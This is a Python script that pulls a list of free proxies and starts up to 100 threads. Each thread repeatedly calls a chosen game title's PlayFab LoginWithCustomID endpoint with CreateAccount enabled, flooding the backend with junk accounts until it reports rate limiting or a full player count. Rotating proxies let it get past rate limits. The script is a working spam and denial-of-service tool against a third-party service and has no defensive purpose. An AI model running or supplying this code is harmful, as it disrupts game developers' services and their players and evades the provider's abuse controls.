import random
import time
import threading
import colorama
from colorama import *
import os
import requests
import ast

# Initialize colorama
init(convert=True)

# Global Variables
spamming = False
accpersec = 0
threadsready = False
workingproxies = 0

# Colors
errir = lambda: print(f"{Fore.WHITE} [{Fore.RED}ERROR{Fore.WHITE}] {Fore.RESET}")
sucess = lambda: print(f"{Fore.WHITE} [{Fore.GREEN}SUCCESS{Fore.WHITE}] {Fore.RESET}")
consol = lambda: print(f"{Fore.WHITE} [{Fore.BLUE}CONSOLE{Fore.WHITE}] {Fore.RESET}")

# Loading Message
consol()
print(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}] LOADING MODULES AND ASSETS")

# Fetch Proxies
url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
proxget = requests.get(url=url)
proxlist = proxget.text.splitlines()
print(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}] FOUND {len(proxlist)} PROXIES")

# Cache Proxies Functions
def cache_proxies(proxies):
    with open("cache_proxies.txt", "w") as w:
        w.write(str(proxies))

def read_cached_proxies():
    with open("cache_proxies.txt", "r") as readFile:
        proxies = readFile.read()
    return ast.literal_eval(proxies)

cache_proxlist = read_cached_proxies() if os.path.exists("cache_proxies.txt") else proxlist

# Proxy Getter
def get_http_proxy(index):
    return proxlist[index]

def get_cached_proxy(index):
    return cache_proxlist[index]

# Spam PlayFab
def spamPlayfab(titleID, prefix, spamProxy, useCache):
    global workingproxies, accpersec, threadsready
    while True:
        if threadsready:
            playfabAPIRoute = f"https://{titleID}.playfabapi.com/Client/LoginWithCustomID"
            cid = f"{prefix}{random.randint(0, 999999)}"
            payload = {
                "TitleId": titleID,
                "CreateAccount": True,
                "CustomId": cid
            }

            proxies = {
                "http": spamProxy,
                "https": spamProxy
            }

            try:
                response = requests.post(
                    url=playfabAPIRoute,
                    json=payload,
                    proxies=proxies
                )
            except Exception as e:
                print(f"Error with proxy {spamProxy}: {str(e)}")
                if useCache:
                    cache_proxlist.remove(spamProxy)
                    cache_proxies(cache_proxlist)
                else:
                    proxlist.remove(spamProxy)
                    cache_proxies(proxlist)
                workingproxies -= 1
                break

            responseJson = response.json()

            if responseJson.get('code') == 200:
                print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.WHITE}]{Fore.RESET} ACCOUNT CREATED: {responseJson['data']['EntityToken']['Entity']['Id']} WITH CUSTOM ID: {cid}")
                accpersec += 1
            elif responseJson.get('code') == 429:
                print(f"{Fore.WHITE}[{Fore.RED}ERROR{Fore.WHITE}]{Fore.RESET} Rate limited or PlayFab storage full")
            elif 'error' in responseJson:
                if responseJson['error'] == 'EvaluationModePlayerCountExceeded':
                    print(f"{Fore.WHITE}[{Fore.RED}ERROR{Fore.WHITE}]{Fore.RESET} PlayFab is full.")
                else:
                    print(f"Error: {responseJson}")

# Main function
def main(titleid, prefix, useCache):
    global workingproxies, threadsready
    spamThreads = []
    if useCache:
        cache = True
        print(f"Got {len(cache_proxlist)} proxies from cache.")
        workingproxies = len(cache_proxlist)
        proxAmt = len(cache_proxlist)
    else:
        cache = False
        print(f"Got {len(proxlist)} proxies.")
        workingproxies = len(proxlist)
        proxAmt = len(proxlist)

    # Create a maximum of 100 threads
    max_threads = 100
    print(f"Creating up to {max_threads} threads.")
    for i in range(min(proxAmt, max_threads)):
        if useCache:
            randProxy = get_cached_proxy(i)
        else:
            randProxy = get_http_proxy(i)
        spamThreads.append(threading.Thread(target=spamPlayfab, args=(titleid, prefix, randProxy, cache)))
    
    print("Starting threads.")
    threadsready = True
    for thread in spamThreads:
        print(f"Thread Started: {thread}")
        thread.start()
    
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.WHITE}]{Fore.RESET} All threads ready!")

# Input
titleid = input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Title ID to Spam: ")
prefix = input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Custom ID Prefix: ")

# Start the process
main(titleid, prefix, useCache=False)
